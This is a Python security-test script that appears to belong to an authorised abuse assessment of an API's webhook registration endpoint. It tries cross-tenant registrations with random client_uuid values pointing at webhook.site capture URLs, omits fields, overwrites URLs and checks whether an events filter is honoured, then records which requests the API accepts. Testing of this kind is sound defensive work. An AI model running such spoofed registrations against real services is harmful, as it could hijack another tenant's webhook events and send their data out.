"""Scenario 5 — webhook-spoof-no-event-filter.

DRIFT-G* showed `/webhooks/register` has no `events` filter and no per-event
subscription. Combined with cross-tenant `client_uuid` open question. Exploit:

P1. Register a webhook with a benign URL we control (webhook.site placeholder).
    Per DRIFT-G5, registration response is opaque ({"message": ...}). No id.
P2. Register a webhook with a BOGUS `client_uuid` — a UUID that is NOT our
    tenant. If accepted (200): cross-tenant spoof — attacker can hijack ALL
    events for someone else's tenant. If rejected: the API validates
    `client_uuid` against the auth context.
P3. Register without `client_uuid` field — does it fall back to auth context, or
    400-reject?
P4. Register with our own client_uuid but different webhook_url N times — does
    last-write-win (per DRIFT-G5 hypothesis) or accumulate?

We are NOT going to trigger an actual webhook delivery (that's the security
agent's job). We only verify which registrations the API ACCEPTS — the
spoofability surface.

Run: python3 evidence/work/abuse/webhook-spoof-no-event-filter/run.py
"""
from __future__ import annotations

import sys
import uuid
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))

from _abuse_common import (  # noqa: E402
    BASE_URL,
    CLIENT_ID,
    base_headers,
    call,
    write_summary,
)

SLUG = "webhook-spoof-no-event-filter"

# Use a single webhook.site placeholder URL for the run.
# IMPORTANT: this is just a placeholder URL — we are not asking webhook.site to
# do anything; we don't even need to visit it. The point is to see which
# `client_uuid` values Kira accepts. Use a UUID we own for the path so even if
# the URL is somehow reachable, no PII goes anywhere meaningful.
CAPTURE_HOST = f"https://webhook.site/{uuid.uuid4()}"

# Two bogus `client_uuid` candidates: random UUIDs not associated with our tenant.
BOGUS_CLIENTS = [str(uuid.uuid4()) for _ in range(3)]


def main() -> None:
    register_url = f"{BASE_URL}/webhooks/register"  # per DRIFT-G6, no /v1/ prefix
    fake_secret = "0" * 32  # known-fake, redacted in evidence

    iterations = []

    def _do(label: str, body: dict, filename: str):
        h = base_headers()
        h["idempotency-key"] = str(uuid.uuid4())
        s, parsed, _, _ = call(
            method="POST",
            url=register_url,
            headers=h,
            body=body,
            scenario_slug=SLUG,
            outcome_hint=label,
            filename=filename,
        )
        iterations.append({"label": label, "status": s,
                           "body_shape": list(parsed.keys()) if isinstance(parsed, dict) else None,
                           "request_client_uuid_kind": _classify_client(body.get("client_uuid"))})
        return s, parsed

    # ---- P1: baseline — register with our own client_uuid -----------------
    _do(
        "P1-baseline-own-client_uuid",
        {"webhook_url": CAPTURE_HOST, "secret": fake_secret, "client_uuid": CLIENT_ID},
        "01-P1-baseline-own-client_uuid",
    )

    # ---- P2: bogus client_uuid (cross-tenant spoof attempt) ---------------
    for i, bogus in enumerate(BOGUS_CLIENTS):
        _do(
            f"P2-bogus-client_uuid-{i}",
            {"webhook_url": CAPTURE_HOST, "secret": fake_secret, "client_uuid": bogus},
            f"02-P2-bogus-client_uuid-{i:02d}",
        )

    # ---- P3: omit client_uuid altogether ---------------------------------
    _do(
        "P3-omit-client_uuid",
        {"webhook_url": CAPTURE_HOST, "secret": fake_secret},
        "03-P3-omit-client_uuid",
    )

    # ---- P4: client_uuid = our id but different URL (last-write check) ---
    _do(
        "P4-overwrite-1",
        {"webhook_url": f"https://webhook.site/{uuid.uuid4()}",
         "secret": fake_secret, "client_uuid": CLIENT_ID},
        "04-P4-overwrite-1",
    )
    _do(
        "P4-overwrite-2",
        {"webhook_url": f"https://webhook.site/{uuid.uuid4()}",
         "secret": fake_secret, "client_uuid": CLIENT_ID},
        "05-P4-overwrite-2",
    )

    # ---- P5: register with an `events` field (spec-doc claim) → see if API honors ----
    _do(
        "P5-with-events-field",
        {"webhook_url": CAPTURE_HOST, "secret": fake_secret, "client_uuid": CLIENT_ID,
         "events": ["payout.completed", "user.created"]},
        "06-P5-with-events-field",
    )

    # ---- Cleanup: restore our tenant to the baseline URL ------------------
    _do(
        "cleanup-restore-baseline",
        {"webhook_url": CAPTURE_HOST, "secret": fake_secret, "client_uuid": CLIENT_ID},
        "07-cleanup-restore-baseline",
    )

    summary = {
        "scenario": SLUG,
        "iterations": iterations,
        "cross_tenant_spoof_accepted": any(
            i["label"].startswith("P2") and 200 <= i["status"] < 300 for i in iterations),
        "p3_omit_status": next((i["status"] for i in iterations if i["label"] == "P3-omit-client_uuid"), None),
    }
    write_summary(SLUG, summary)
    from collections import Counter
    c = Counter([(i["label"], i["status"]) for i in iterations])
    print(f"[{SLUG}] cross_tenant_spoof_accepted={summary['cross_tenant_spoof_accepted']} "
          f"P3_omit_status={summary['p3_omit_status']} all_results={dict(c)}")


def _classify_client(cu):
    if cu is None:
        return "absent"
    if cu == CLIENT_ID:
        return "own"
    return "bogus-random-uuid"


if __name__ == "__main__":
    main()
